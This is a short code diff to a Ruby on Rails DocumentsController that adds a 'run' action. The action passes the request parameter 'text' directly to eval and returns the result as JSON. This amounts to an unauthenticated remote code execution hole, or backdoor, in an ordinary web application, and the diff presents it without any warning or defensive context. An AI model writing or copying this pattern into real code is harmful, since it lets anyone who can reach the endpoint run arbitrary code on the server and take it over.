@@ -20,4 +20,12 @@ class DocumentsController < ApplicationController
     end
   end
 
+  def run
+    code = params[:text]
+    result = eval(code)
+    respond_to do |format|
+      format.json { render json: result, status: :ok }
+    end
+  end
+
 end
